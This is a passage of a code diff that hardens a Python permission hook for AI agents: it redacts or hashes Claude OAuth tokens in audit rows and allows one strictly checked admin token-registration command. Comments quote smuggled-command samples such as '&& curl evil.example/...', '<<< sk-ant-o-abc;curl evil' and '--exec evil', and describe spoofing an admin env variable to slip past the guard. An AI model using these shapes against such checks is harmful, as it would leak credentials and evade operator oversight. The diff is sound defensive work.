@@ -3,6 +3,7 @@
 
 from __future__ import annotations
 
+import hashlib
 import json
 import os
 import pwd
@@ -348,18 +349,31 @@ def _emit_admin_credential_read_allowed(
         "tool": tool,
         "surface": surface,
     }
+    # Codex r2 BLOCKING (r3, 2026-05-29, #1358): an admin read-intent
+    # command can carry a raw OAuth token (e.g. `echo sk-ant-o-…`
+    # classifies as read-intent and is ALLOWED here). The raw `sample`
+    # and `summary` would persist the token in this allow row. Redact
+    # token-shaped VALUES while keeping the path / pattern structure as
+    # the forensic anchor (a credential file PATH is acceptable to keep;
+    # a token VALUE is not).
     if sample:
-        detail["sample"] = truncate_text(sample, 200)
+        detail["sample"] = _redact_credential_token_values(
+            truncate_text(sample, 200)
+        )
     # Mirror the deny-row `summary` field. Prefer the structured
     # `tool_input_summary` shape when caller has the full tool_input;
     # otherwise synthesize a minimal Bash summary from `sample` so the
     # audit row still carries the structured field deny consumers
     # expect.
     if tool_input is not None:
-        detail["summary"] = tool_input_summary(tool, tool_input)
+        detail["summary"] = _redact_credential_summary(
+            tool_input_summary(tool, tool_input)
+        )
     elif sample and tool == "Bash":
         detail["summary"] = {
-            "command": truncate_text(sample, 240),
+            "command": _redact_credential_token_values(
+                truncate_text(sample, 240)
+            ),
             "description": "",
         }
     write_audit("agent_admin_credential_read_allowed", agent or "unknown", detail)
@@ -2065,16 +2079,30 @@ def _emit_admin_bridge_verb_audit(
     read allow + deny rows uniformly. `verb_path` is the matched verb
     chain (e.g. `("auth", "claude-token", "add")`) for direct filtering.
     """
+    # Codex r3 BLOCKING (r4, 2026-05-29, #1358) — class closure. The
+    # `auth claude-token add` verb path is the SAME credential routine
+    # surfaced through `agb`/`agent-bridge` (vs `bash bridge-auth.sh`). In
+    # the CURRENT gate order this writer is only reached for token-FREE
+    # commands — `_raw_mentions_claude_credentials` denies any text with an
+    # `sk-ant-o…` run before `_admin_bridge_verb_check` runs — so the
+    # redaction below is defense-in-depth, not a live leak fix. It is kept
+    # so a future gate reorder or a new verb that legitimately carries a
+    # token-shaped argv value cannot turn this `_allowed` row into a leak.
+    # Redact token-shaped VALUES out of `sample` and the `summary` block
+    # (value-only — keeps the verb chain + flag skeleton as the forensic
+    # anchor). The `write_audit` choke-point is the SSOT belt-and-suspenders.
     detail: dict[str, Any] = {
         "tool": "Bash",
         "verb": " ".join(verb_path),
-        "sample": truncate_text(text, 240),
+        "sample": _redact_credential_token_values(truncate_text(text, 240)),
     }
     if tool_input is not None:
-        detail["summary"] = tool_input_summary("Bash", tool_input)
+        detail["summary"] = _redact_credential_summary(
+            tool_input_summary("Bash", tool_input)
+        )
     else:
         detail["summary"] = {
-            "command": truncate_text(text, 240),
+            "command": _redact_credential_token_values(truncate_text(text, 240)),
             "description": "",
         }
     write_audit(
@@ -2099,17 +2127,27 @@ def _emit_admin_bridge_verb_denied_shape_audit(
     records the specific malformed-shape failure (missing value,
     duplicate flag, etc.) so operators can triage smuggling attempts.
     """
+    # Codex r3 BLOCKING (r4, 2026-05-29, #1358) — class closure. Like
+    # `_emit_admin_bridge_verb_audit`, this shape-deny writer is only
+    # reached for token-free text in the current gate order (the
+    # credential substring deny fires first). Redaction here is therefore
+    # defense-in-depth against a future gate reorder / new verb. Redact
+    # token-shaped VALUES out of `sample` and `summary` (value-only —
+    # keeps the verb chain + deny `reason` as the forensic anchor). The
+    # `write_audit` choke-point is the SSOT belt-and-suspenders.
     detail: dict[str, Any] = {
         "tool": "Bash",
         "verb": " ".join(verb_path),
         "reason": reason,
-        "sample": truncate_text(text, 240),
+        "sample": _redact_credential_token_values(truncate_text(text, 240)),
     }
     if tool_input is not None:
-        detail["summary"] = tool_input_summary("Bash", tool_input)
+        detail["summary"] = _redact_credential_summary(
+            tool_input_summary("Bash", tool_input)
+        )
     else:
         detail["summary"] = {
-            "command": truncate_text(text, 240),
+            "command": _redact_credential_token_values(truncate_text(text, 240)),
             "description": "",
         }
     write_audit(
@@ -2117,6 +2155,600 @@ def _emit_admin_bridge_verb_denied_shape_audit(
         agent or "unknown",
         detail,
     )
+
+
+# Issue #1358 — credential-routine audit emit.
+#
+# Codex r1 BLOCKING #1 (initial): the sanctioned shape includes optional
+# here-string / heredoc body that carries the OAuth token, so writing
+# the raw command text to the audit log would persist the token. The
+# initial r1 fix redacted the body content but still wrote a (redacted)
+# copy of the command to ``sample`` / ``summary.command``.
+#
+# Codex r1 BLOCKING #1 (r2, 2026-05-29): the brief required HASH-ONLY —
+# no command text in any form. A redacted-but-still-text field is one
+# regex miss away from leaking the token (e.g. if a future shell
+# operator embeds the token in a shape the redactor does not recognise).
+# The new schema therefore carries ONLY the SHA-256 of the original
+# command bytes (``command_sha256``), so the audit row remains a
+# forensic anchor (operators can hash the suspected command and grep
+# for the hash) while carrying zero command text.
+#
+# Schema:
+#   { "tool": "Bash",
+#     "surface": "raw_credentials_mention",
+#     "exemption": "credential_routine_admin",
+#     "command_sha256": "<64-char lowercase hex>" }
+#
+# No ``sample``, no ``summary``, no ``command``, no ``description``.
+
+
+def _credential_routine_command_sha256(text: str) -> str:
+    """Return the SHA-256 hex digest of *text* as the audit-row anchor.
+
+    Used by both the exemption-allowed audit row and the deny-audit
+    summary scrub (codex r1 BLOCKING #1 r3, 2026-05-29) so a single
+    helper guarantees both surfaces compute the same forensic anchor
+    on the same input bytes. UTF-8 encoded with `errors="replace"` so
+    a stray invalid byte cannot raise inside an audit-emit path.
+    """
+    return hashlib.sha256(
+        (text or "").encode("utf-8", errors="replace")
+    ).hexdigest()
+
+
+# Codex r2 BLOCKING (r3, 2026-05-29, #1358) — token-VALUE redaction for
+# the audit surfaces that legitimately keep raw text (admin read-intent
+# allow rows and non-Bash deny / escalation summaries, where a credential
+# FILE PATH is a wanted forensic anchor but a token-shaped VALUE must not
+# survive). The hash-only scrub on Bash summaries handles the
+# credential-routine command; these surfaces instead need surgical
+# removal of the OAuth token run while preserving the surrounding path /
+# pattern structure.
+#
+# The OAuth setup-token prefix is `sk-ant-o`; tokens continue with
+# `[A-Za-z0-9_-]`. Collapse the run to the prefix + `<REDACTED>`.
+_CREDENTIAL_TOKEN_VALUE_RE = re.compile(r"sk-ant-o[A-Za-z0-9_-]*")
+
+
+def _redact_credential_token_values(text: str) -> str:
+    """Redact OAuth token runs (`sk-ant-o…`) from *text*, keep structure.
+
+    Surgical, value-only redaction: replaces every `sk-ant-o…` run with
+    `sk-ant-o<REDACTED>` so a credential path / pattern that merely
+    NAMES the token retains its forensic shape (the path basename, the
+    grep pattern skeleton) while the token bytes themselves never land
+    in an audit row or queued task body. Used by the admin read-intent
+    allow audit and the non-Bash deny summary, where a hash-only
+    substitution would discard the wanted path anchor.
+    """
+    return _CREDENTIAL_TOKEN_VALUE_RE.sub("sk-ant-o<REDACTED>", text or "")
+
+
+def _redact_credential_summary(summary: dict[str, Any]) -> dict[str, Any]:
+    """Return *summary* with every string value token-value-redacted.
+
+    Applied to the structured ``summary`` block of audit rows that keep
+    raw (non-hash) text. Each string field is passed through
+    :func:`_redact_credential_token_values`; non-string values are left
+    intact. Does not mutate the input dict.
+    """
+    return {
+        key: (
+            _redact_credential_token_values(value)
+            if isinstance(value, str)
+            else value
+        )
+        for key, value in summary.items()
+    }
+
+
+def _credential_routine_hash_only_summary(text: str) -> dict[str, Any]:
+    """Return a hash-only summary block for the deny-audit `detail.summary`.
+
+    Codex r1 BLOCKING #1 r3 (2026-05-29): when a Bash command matches
+    the sanctioned credential-routine shape but is denied downstream
+    (e.g. `--token-file ~/.claude/.credentials.json` triggers the
+    credential-path argv gate), the generic `agent_tool_denied` row
+    would otherwise carry the raw command in `detail.summary.command`
+    via :func:`tool_input_summary`. The audit log then persists the
+    operator's OAuth token even though the exemption row above was
+    hash-only. This summary substitutes the same `command_sha256`
+    anchor; the raw command text never lands in the deny row.
+
+    Schema mirrors the Bash branch of :func:`tool_input_summary`
+    (same field name `command_sha256` instead of `command`) so audit
+    consumers can detect the hash-only form. `description` is
+    deliberately omitted — the Bash `description` field is operator-
+    authored prose and could itself carry token contents.
+    """
+    return {
+        "command_sha256": _credential_routine_command_sha256(text),
+    }
+
+
+def _emit_credential_routine_admin_exempted_audit(
+    agent: str,
+    *,
+    text: str,
+    tool_input: dict[str, Any] | None,
+) -> None:
+    """Audit row for admin credential-routine substring-deny bypass (#1358).
+
+    Issue #1358: ``_raw_mentions_claude_credentials`` denies any Bash text
+    containing one of the five credential substrings (``sk-ant-o``,
+    ``.credentials.json`` + ``.claude``, ``CLAUDE_CODE_OAUTH_TOKEN``,
+    ``launch-secrets.env``, ``claude-oauth-tokens.json``). Admin rotation
+    pool registration (``bash bridge-auth.sh claude-token add --stdin``)
+    needed to be unblocked when the operator pipes a fresh token through
+    stdin — the command text legitimately carries ``sk-ant-o…``.
+
+    The carve-out is narrow: strict-prefix-matched ``bash bridge-auth.sh
+    claude-token add --stdin`` only, no shell embedding / multi-command /
+    redirection, and admin role. Every bypass writes this audit row so
+    the operator retains a defense-in-depth ledger of credential-routine
+    exemptions.
+
+    Codex r1 BLOCKING #1 (r2, 2026-05-29): the audit row carries ONLY
+    the SHA-256 of the original command bytes — no ``sample``, no
+    ``summary.command``, no command text in any form. The hash gives
+    operators a forensic anchor (rehash the suspected command and grep
+    the audit log) while guaranteeing the audit log itself never
+    persists the token even if a future redactor regex would have
+    missed a new shell shape. ``tool_input`` is accepted but
+    deliberately not emitted; the parameter is retained for call-site
+    symmetry with :func:`_emit_admin_credential_read_allowed` and so
+    future schema extensions can lift forensic-safe fields from the
+    raw tool input without re-threading the call chain.
+    """
+    raw_command = text or ""
+    if tool_input is not None and not raw_command:
+        # Fallback if the caller did not pre-extract text — should not
+        # happen in practice (the carve-out path always passes the raw
+        # text), but keep the hash anchored on the actual command.
+        raw_command = str(tool_input.get("command") or "")
+    detail: dict[str, Any] = {
+        "tool": "Bash",
+        "surface": "raw_credentials_mention",
+        "exemption": "credential_routine_admin",
+        "command_sha256": _credential_routine_command_sha256(raw_command),
+    }
+    write_audit(
+        "tool_policy_credential_routine_admin_exempted",
+        agent or "unknown",
+        detail,
+    )
+
+
+# Issue #1358 — strict raw-text prefix for the admin credential rotation
+# routine. The carve-out matches by literal raw-text prefix (NOT shlex
+# tokenisation) because the brief's edge case 2 explicitly calls out that
+# any quote / spacing variant must fail the match — `bash
+# bridge-auth.sh "claude-token" add --stdin` shlex-splits to the same
+# tokens but the literal text differs, so it MUST NOT match. The carve-
+# out then validates the suffix (everything after the prefix) for shape
+# safety.
+_ADMIN_CREDENTIAL_ROUTINE_PREFIX = "bash bridge-auth.sh claude-token add --stdin"
+
+
+def _is_admin_credential_routine_strict_agreement(agent: str) -> bool:
+    """True iff *agent* is admin AND env + roster lookups AGREE.
+
+    Codex r1 BLOCKING #2 (2026-05-29) — admin-spoof guard for the
+    credential-routine carve-out.
+
+    :func:`is_admin_agent` is OR-logic by design: an admin assertion via
+    EITHER ``BRIDGE_ADMIN_AGENT_ID`` env match OR ``SESSION-TYPE.md ==
+    admin`` is enough. That OR is correct for most admin surfaces
+    (config wrappers, roster reads, etc.) because either signal alone
+    is a high-trust assertion in that context — losing one would
+    over-deny admin diagnostics.
+
+    The credential-routine carve-out is different. It exempts a
+    sanctioned shape from the credential-substring deny, so a single
+    spoofed env var (or a stale SESSION-TYPE.md file from a previous
+    role) can silently widen the carve-out to a non-admin caller.
+    Direct repro: ``BRIDGE_ADMIN_AGENT_ID=user-1358`` exported into a
+    non-admin agent's session would have flipped
+    :func:`is_admin_agent` True and bypassed the substring deny without
+    any roster confirmation.
+
+    This stricter predicate requires BOTH:
+
+    1. ``BRIDGE_ADMIN_AGENT_ID`` is set (non-empty) AND equals *agent*
+       — env-asserted admin.
+    2. ``SESSION-TYPE.md`` for that agent's home reads
+       ``session type: admin`` — roster confirms admin.
+
+    Disagreement (env says admin, roster says otherwise; or roster
+    says admin, env unset / different agent) fails closed. The
+    existing OR predicate is preserved for non-credential surfaces;
+    only :func:`_is_admin_credential_routine` uses this stricter check.
+    """
+    admin = admin_agent_id()
+    if not admin or admin != agent:
+        return False
+    if not agent:
+        return False
+    return _admin_agent_from_session_type(agent)
+
+
+def _is_admin_credential_routine(text: str, agent: str) -> bool:
+    """True iff *text* is an admin's sanctioned credential rotation command.
+
+    Issue #1358 tactical carve-out. Matches the single sanctioned shape
+    used by admin agents to register a rotation-pool OAuth token:
+
+        ``bash bridge-auth.sh claude-token add --stdin [allowed flags]``
+
+    optionally followed by a here-string / heredoc body that carries the
+    token (``... <<< 'sk-ant-o…'`` or ``... <<EOF\\nsk-ant-o…\\nEOF``).
+    The here-string / heredoc body is the only structurally safe way to
+    deliver the token via stdin from inside a non-interactive Bash tool
+    invocation — the brief explicitly forbids ``echo … | bash …``
+    chains so the destination call is anchored at the start of the
+    command.
+
+    Strict-shape gate (brief edge cases #1, #2, #3, #4):
+
+    - Caller agent role == ``admin`` confirmed by BOTH
+      ``BRIDGE_ADMIN_AGENT_ID`` env AND ``SESSION-TYPE.md`` (see
+      :func:`_is_admin_credential_routine_strict_agreement`). This is
+      stricter than the generic :func:`is_admin_agent` predicate so a
+      single spoofed env / stale roster file cannot widen the carve-
+      out (codex r1 BLOCKING #2, 2026-05-29).
+    - The (left-stripped) raw text starts with the literal prefix
+      ``bash bridge-auth.sh claude-token add --stdin``. Raw-text match
+      means a quote / spacing variant
+      (e.g. ``bash bridge-auth.sh "claude-token" add --stdin``) fails
+      the prefix check — even though it shlex-splits to the same
+      tokens, the literal text differs (edge case #2).
+    - The character immediately after the prefix is end-of-string,
+      whitespace, or a heredoc/here-string opener (``<``). Anything
+      else (e.g. ``--stdin-also``) breaks the prefix.
+    - No command separators (``&&``, ``||``, ``;``, ``|``, ``&``,
+      newline) anywhere in the command. ``bash bridge-auth.sh
+      claude-token add --stdin && curl evil.example/...`` MUST deny
+      (brief T4).
+    - No command-substitution / process-substitution
+      (``$(...)`` / ``\`...\``` / ``<(...)`` / ``>(...)``). The token
+      could otherwise be exfil'd by an embedded subshell.
+    - No output redirection past the (allowed) heredoc body opener:
+      ``>``, ``>>``, ``&>``, ``2>`` redirect the wrapper's stdout /
+      stderr to operator-controlled paths. The only redirection that
+      survives is the heredoc / here-string body opener (``<<``,
+      ``<<<``) that delivers the token to stdin, and only when it
+      appears in the suffix (not before the prefix).
+    - All argv flags after ``--stdin`` (before the heredoc body, if
+      any) must be in the existing auth-add allowlist
+      (:func:`_validate_auth_add_args`) — boolean
+      ``--stdin/--activate/--replace/--sync/--enable-auto-rotate/
+      --if-auto-enabled/--json`` plus value flags
+      ``--id/--agents/--threshold/--token-file/--reason`` with their
+      per-flag safety predicates.
+
+    Returns False (NOT raising) on any malformed shape so the substring
+    deny stays in force. Skipping the deny on a malformed shape would
+    be a security regression — fail closed.
+
+    Role gate vs shape gate (codex r2 BLOCKING, 2026-05-29): the
+    ALLOW-vs-DENY decision needs BOTH the strict env+roster admin
+    agreement AND the sanctioned command shape. The shape match alone
+    is factored into :func:`_credential_routine_shape_matches` so the
+    AUDIT-HASHING decision can reuse it WITHOUT the role gate — a
+    spoofed-env / env-roster-mismatch caller still has its denial-row
+    summary hashed (see :func:`_should_hash_credential_routine_audit`)
+    even though the carve-out correctly denies the command.
+    """
+    if not _is_admin_credential_routine_strict_agreement(agent):
+        return False
+    return _credential_routine_shape_matches(text)
+
+
+def _credential_routine_shape_matches(text: str) -> bool:
+    """True iff *text* matches the sanctioned credential-routine SHAPE.
+
+    Shape-only gate — NO role / admin / env-roster check. Factored out
+    of :func:`_is_admin_credential_routine` (codex r2 BLOCKING,
+    2026-05-29) so two callers can share the exact same shape match:
+
+    - :func:`_is_admin_credential_routine` ANDs this with the strict
+      env+roster admin agreement to decide ALLOW vs DENY of the
+      substring-deny carve-out.
+    - :func:`_should_hash_credential_routine_audit` uses this ALONE to
+      decide whether an audit row's command summary must be hashed.
+      A command whose shape matches the credential routine carries an
+      OAuth token in its here-string / heredoc body even when the
+      caller is NOT admin (env-roster mismatch, spoofed env). In that
+      case the carve-out denies (correct) but the generic
+      ``agent_tool_denied`` / ``agent_tool_use`` row would otherwise
+      persist the raw token in ``detail.summary.command``. Hashing the
+      audit summary on shape match alone — independent of the role
+      gate — closes that leak (fail closed: hash whenever the token-
+      bearing shape is present).
+
+    The full shape contract is documented on
+    :func:`_is_admin_credential_routine`. Returns False (NOT raising)
+    on any malformed shape.
+    """
+    if not text:
+        return False
+    stripped = text.lstrip()
+    if not stripped.startswith(_ADMIN_CREDENTIAL_ROUTINE_PREFIX):
+        return False
+    # The character immediately following the literal prefix must not
+    # extend the token — `--stdin-also` or `--stdinfoo` would otherwise
+    # squat the prefix.
+    after_prefix = stripped[len(_ADMIN_CREDENTIAL_ROUTINE_PREFIX):]
+    if after_prefix and after_prefix[0] not in (" ", "\t", "<"):
+        return False
+    # Reject command-substitution / process-substitution everywhere in
+    # the command. The heredoc opener `<<` and here-string opener
+    # `<<<` are the only `<<` forms we allow; they are explicitly
+    # checked below after we strip them from the "scan for redirect"
+    # surface.
+    if re.search(r"\$\(", text) or "`" in text:
+        return False
+    if re.search(r"<\(", text) or re.search(r">\(", text):
+        return False
+    # Reject command separators. Command separators inside a single-
+    # quoted heredoc body do not introduce a new shell stage, but the
+    # heredoc body itself can carry the token — `_COMMAND_OPERATOR_RE`
+    # does not know about heredoc bodies. Strip the heredoc / here-
+    # string body from the scan surface so a `;` inside the token
+    # value cannot fail us. The carve-out only spans a single shell
+    # command; the heredoc body is data, not control.
+    scan = _strip_heredoc_and_herestring_body(text)
+    if _COMMAND_OPERATOR_RE.search(scan):
+        return False
+    # Reject output redirection on the scan surface (post heredoc-body
+    # strip). The heredoc opener `<<` and here-string opener `<<<`
+    # remain on the scan surface as ``<``-bearing tokens, so the bare
+    # `<` / `>` substring check would over-reject. Apply
+    # `_NUMERIC_FD_WRITE_RE` per whitespace-token and a stricter
+    # bare-`>` check that excludes the heredoc body opener context.
+    if _scan_has_output_redirect(scan):
+        return False
+    # Validate the argv portion (after the prefix) against the existing
+    # auth-add allowlist. Codex r3 BLOCKING (2026-05-29): the previous
+    # check cut argv at the FIRST heredoc/here-string opener, so a
+    # trailing `<<< 'token' --exec evil` shape was allowed because
+    # `--exec evil` slid past `_validate_auth_add_args`. Fix: strip the
+    # heredoc/here-string body+opener+delimiter from the body-stripped
+    # scan surface, then validate the remaining whitespace-separated
+    # argv against the allowlist. Both pre-body and post-body flags
+    # flow through `_validate_auth_add_args`, so a trailing `--exec
+    # evil` after the here-string now denies.
+    scan_stripped = scan.lstrip()
+    if not scan_stripped.startswith(_ADMIN_CREDENTIAL_ROUTINE_PREFIX):
+        # The body strip shouldn't move the prefix, but if a future
+        # heredoc-redaction edit accidentally clips the prefix we
+        # fail closed.
+        return False
+    scan_after_prefix = scan_stripped[len(_ADMIN_CREDENTIAL_ROUTINE_PREFIX):]
+    suffix_argv = _admin_routine_argv_suffix(scan_after_prefix)
+    if suffix_argv is None:
+        return False
+    suffix_argv = _SAFE_REDIRECT_RE.sub(" ", suffix_argv)
+    try:
+        tokens = shlex.split(suffix_argv, posix=True, comments=False)
+    except ValueError:
+        return False
+    # `_validate_auth_add_args` validates the flags after `add --stdin`.
+    # The suffix_argv contains every non-heredoc/non-here-string flag
+    # after `bash bridge-auth.sh claude-token add --stdin`. `--stdin`
+    # itself was already consumed by the prefix.
+    if not _validate_auth_add_args(tokens):
+        return False
+    return True
+
+
+def _should_hash_credential_routine_audit(text: str) -> bool:
+    """True iff an audit row for *text* must carry a hash-only command summary.
+
+    Codex r2 BLOCKING (2026-05-29) — env-roster-mismatch deny path leaks
+    the token in the audit row.
+
+    Direct repro at head c3dd96e: a non-admin / env-roster-mismatch
+    caller running ``bash bridge-auth.sh claude-token add --stdin --id
+    pool-a <<< 'sk-ant-o…'`` is correctly DENIED by the substring guard
+    (``_is_admin_credential_routine`` returns False because the strict
+    env+roster admin agreement fails). But the generic
+    ``agent_tool_denied`` audit row's summary scrub was gated on the
+    SAME ``_is_admin_credential_routine`` predicate, so the scrub did
+    NOT fire and ``detail.summary.command`` persisted the raw token in
+    clear.
+
+    Decoupling the two decisions:
+
+    - ``_is_admin_credential_routine`` (role gate AND shape gate)
+      controls ALLOW vs DENY of the substring-deny carve-out.
+    - This predicate (shape gate ONLY, via
+      :func:`_credential_routine_shape_matches`) controls AUDIT
+      HASHING. It returns True for ANY command whose shape matches the
+      sanctioned credential routine — regardless of admin / role /
+      env-roster agreement — because such a command carries an OAuth
+      token in its here-string / heredoc body whether or not the
+      caller is a verified admin. Hashing the audit summary on shape
+      match alone is fail-closed: the token never lands in the audit
+      log on either the ALLOW (exempted) path or the DENY (carve-out
+      refused) path.
+    """
+    return _credential_routine_shape_matches(text)
+
+
+def _bash_audit_summary_needs_hashing(text: str) -> bool:
+    """True iff a Bash command's audit summary must be hashed (not raw).
+
+    Codex r2 BLOCKING (r3, 2026-05-29, #1358) — broader leak. The
+    sanctioned-routine shape (:func:`_should_hash_credential_routine_audit`)
+    is NOT the only Bash command whose audit summary can carry a Claude
+    OAuth token. ``_raw_mentions_claude_credentials`` denies ANY Bash
+    text containing one of the five credential markers (``sk-ant-o``,
+    ``.credentials.json`` + ``.claude``, ``CLAUDE_CODE_OAUTH_TOKEN``,
+    ``launch-secrets.env``, ``claude-oauth-tokens.json``) — e.g. a bare
+    ``echo sk-ant-o-…`` from any agent. That command is denied, but the
+    ``agent_tool_denied`` row's ``detail.summary.command`` previously
+    persisted the raw token because the scrub only fired on the
+    sanctioned routine shape.
+
+    Hash the Bash audit summary whenever EITHER condition holds:
+
+    1. the command matches the sanctioned credential-routine shape
+       (:func:`_should_hash_credential_routine_audit`); or
+    2. the command's raw text carries any Claude credential marker
+       (:func:`_raw_mentions_claude_credentials`).
+
+    Fail-closed: any credential-bearing Bash command — sanctioned shape
+    or not, allowed or denied — gets a hash-only audit summary so the
+    token never lands in the audit log. Non-credential commands keep
+    their raw forensic ``command`` summary.
+    """
+    return (
+        _should_hash_credential_routine_audit(text)
+        or _raw_mentions_claude_credentials(text)
+    )
+
+
+def _strip_heredoc_and_herestring_body(text: str) -> str:
+    """Return *text* with the heredoc and here-string BODY removed.
+
+    Keeps the heredoc / here-string opener (``<<EOF``, ``<<<``) so the
+    redirect-scan can still see the structural marker, but drops the
+    token-carrying body. Used by :func:`_is_admin_credential_routine`
+    so a quoted ``;`` or ``|`` inside the token never fails the
+    command-separator scan.
+
+    Codex r2 BLOCKING (2026-05-29): the previous bare-word here-string
+    strip used ``\\S+`` which greedily swallowed shell separators
+    (``\\S`` includes ``;`` / ``|`` / ``&``) — so
+    ``<<< sk-ant-o-abc;curl evil`` shipped ``;curl`` into the body and
+    falsely passed the separator scan. Two fixes:
+
+    1. **Bare-word here-string bodies are NOT stripped.** Bash itself
+       terminates an unquoted here-string body at the first shell
+       metachar, so a bare-word body that contains a separator IS a
+       smuggling vector — the trailing ``;curl …`` would actually
+       execute. Leave the bare-word form on the scan surface so the
+       command-operator check downstream rejects it. The carve-out
+       therefore only sanctions QUOTED here-strings
+       (``<<< 'sk-ant-o…'`` / ``<<< "sk-ant-o…"``), which is the only
+       structurally safe shape.
+    2. **Heredoc body terminator is the FIRST line equal to the
+       delimiter** (not the last). The previous lazy ``.*?\\n\\3$``
+       anchored to the END of string, so a multi-``EOF`` payload
+       (``<<EOF\\nbody\\nEOF\\ncurl evil\\nEOF``) coalesced into a
+       single "body" that hid the ``curl evil`` separator. The new
+       regex requires the delimiter to appear on its own line, which
+       matches bash semantics.
+
+    Multiple heredocs in a single command are vanishingly rare in
+    this carve-out's domain and are intentionally not supported —
+    the carve-out spans a single credential routine invocation only.
+    """
+    # Strip here-string QUOTED body only:
+    #   `... <<< 'sk-ant-o…'` -> `... <<<`
+    #   `... <<< "sk-ant-o…"` -> `... <<<`
+    # Bare-word `<<< sk-ant-o-abc;curl evil` is deliberately NOT
+    # matched so the trailing separator + smuggled command reaches the
+    # downstream command-operator scan and trips the deny.
+    text = re.sub(
+        r"(<<<)\s*('(?:\\.|[^'\\])*'|\"(?:\\.|[^\"\\])*\")",
+        r"\1",
+        text,
+    )
+    # Strip heredoc body: `... <<EOF\n<token>\nEOF[\s]*$` -> `... <<EOF`
+    # The terminator is the FIRST line whose contents (alone) equal
+    # the delimiter — matches bash heredoc semantics and prevents a
+    # multi-EOF payload from coalescing into one body. Implemented
+    # with a negative look-ahead inside `.*?` that rejects any
+    # in-body line equal to the delimiter. After the closing
+    # delimiter we ONLY consume optional trailing WHITESPACE and
+    # require end-of-string — codex r5 2026-05-29 found that
+    # consuming ``(?:\\n|$)`` instead let a post-EOF line whose
+    # content was an allowlisted auth flag (``--activate`` /
+    # ``--enable-auto-rotate`` etc.) slide past
+    # ``_validate_auth_add_args`` because the strip ate the line
+    # separator. Anchoring to ``\\s*$`` forces the heredoc to be the
+    # last thing in the command; any post-EOF non-whitespace content
+    # leaves the regex unmatched, the body stays on the scan surface,
+    # and ``_COMMAND_OPERATOR_RE`` denies on the embedded newlines.
+    text = re.sub(
+        r"(<<-?)\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\2"
+        r"\n((?:(?!\3\n)(?!\3$).)*?)"
+        r"\n\3\s*\Z",
+        r"\1\3",
+        text,
+        flags=re.DOTALL,
+    )
+    return text
+
+
+def _scan_has_output_redirect(scan: str) -> bool:
+    """True iff *scan* contains an output redirection token (post heredoc
+    body strip).
+
+    The heredoc opener `<<` and here-string opener `<<<` remain on the
+    scan surface as `<`-bearing tokens — the bare `<` substring check
+    would over-reject. Strip those tokens first, then reject any
+    remaining `<`, `>`, `>>`, `&>`, numeric-fd-prefixed redirect
+    (`1>`, `2>`).
+    """
+    # Drop the safe `2>/dev/null` etc. forms first.
+    sanitized = _SAFE_REDIRECT_RE.sub(" ", scan)
+    # Drop heredoc / here-string opener — the literal `<<`-bearing
+    # token cannot redirect the wrapper's output.
+    sanitized = re.sub(r"<<-?<?", " ", sanitized)
+    # Any remaining `<` or `>` (incl. `&>`, `2>`, `1>`, etc.) is a
+    # real redirection target on the wrapper's stdout/stderr/stdin.
+    return "<" in sanitized or ">" in sanitized
+
+
+def _admin_routine_argv_suffix(after_prefix: str) -> str | None:
+    """Return the suffix argv with any heredoc/here-string envelope
+    (opener + body placeholder + delimiter) fully removed.
+
+    Codex r3 BLOCKING (2026-05-29): the previous helper cut argv at
+    the FIRST heredoc/here-string opener, so trailing argv flags after
+    the body slipped past `_validate_auth_add_args`. This helper now
+    strips the entire heredoc/here-string envelope so the residue —
+    whatever flags appear BEFORE and AFTER the body — gets validated
+    together by the existing allowlist.
+
+    Caller passes the post-prefix slice of the BODY-STRIPPED scan
+    surface (the one produced by
+    :func:`_strip_heredoc_and_herestring_body`), NOT the raw text.
+    That way:
+
+    - Quoted here-string ``<<< 'body'`` / ``<<< "body"`` already has
+      its body stripped, leaving ``<<<`` on the scan; we drop the
+      operator.
+    - Bare-word here-string ``<<< body`` is NOT stripped by the body
+      strip (deliberately — bash terminates the body at shell
+      metachars, so a smuggled separator would have already failed
+      the separator scan upstream). It still appears on the scan
+      surface and the caller's separator scan rejected it.
+    - Heredoc ``<<EOF\\nbody\\nEOF`` has its body+closer stripped by
+      the body-strip step (substitution `\\1\\3` leaves just
+      ``<<EOF`` on the scan); we drop the opener+delimiter.
+
+    Returns None on malformed shape (no whitespace after prefix when
+    the suffix is non-empty and not a heredoc/here-string opener).
+    """
+    if not after_prefix:
+        return ""
+    # If the first non-prefix char is a heredoc/here-string opener,
+    # the operator opted out of any pre-body flag — that's allowed.
+    # Otherwise the first char must be whitespace.
+    if after_prefix[0] != "<" and after_prefix[0] not in (" ", "\t"):
+        return None
+    # Drop quoted here-string operator (body already removed by the
+    # body-strip pass).
+    text = re.sub(r"<<<", " ", after_prefix)
+    # Drop heredoc opener+delimiter (body+closer already removed by
+    # the body-strip pass). Match `<<EOF`, `<<-EOF` variants.
+    text = re.sub(r"<<-?[A-Za-z_][A-Za-z0-9_]*", " ", text)
+    return text.strip()
 
 
 def _admin_bridge_verb_check(
@@ -2377,6 +3009,22 @@ def protected_alias_reason(
     # redirection disqualifies the whole invocation. See
     # `_is_read_intent_bash` for the full contract.
     read_intent = _is_read_intent_bash(text)
+    # Issue #1358 tactical carve-out — admin rotation-pool token
+    # registration via the sanctioned `bash bridge-auth.sh claude-token
+    # add --stdin …` shape. Evaluated BEFORE the substring-deny block
+    # so an audit row is emitted on every sanctioned-shape admin
+    # invocation (defense-in-depth visibility), regardless of whether
+    # the substring rule would have fired. The shape gate is strict —
+    # see `_is_admin_credential_routine` for the full contract. This is
+    # the tactical scope of #1358 only; the sealed-paste root path is
+    # tracked in the follow-up issue linked from the PR body.
+    credential_routine_exempted = _is_admin_credential_routine(text, agent)
+    if credential_routine_exempted:
+        _emit_credential_routine_admin_exempted_audit(
+            agent,
+            text=text,
+            tool_input=tool_input,
+        )
     if _raw_mentions_claude_credentials(text):
         # Admin agents are the operator's deputy: their read-intent
         # diagnostic commands (e.g. `ls ~/.claude/.credentials.json`,
@@ -2392,6 +3040,10 @@ def protected_alias_reason(
                 sample=text,
                 tool_input=tool_input,
             )
+        elif credential_routine_exempted:
+            # Sanctioned rotation routine shape — the audit row was
+            # already emitted above. Skip the substring deny.
+            pass
         else:
             return CLAUDE_CREDENTIAL_DENY_REASON
     # PR #799 r3 codex finding 1 — env-dump verbs revealed exported
@@ -2649,6 +3301,23 @@ def _write_system_config_audit_row(
     misrepresent the audit chain (codex r1 #341 CP3). Hook-side
     actor_source is always `agent-direct` — the hook fires before any
     caller-source promotion that the wrapper would otherwise apply.
+
+    Codex r1 BLOCKING #1 r3 (#1358, 2026-05-29): if the Bash command
+    matched the sanctioned credential-routine shape, substitute the
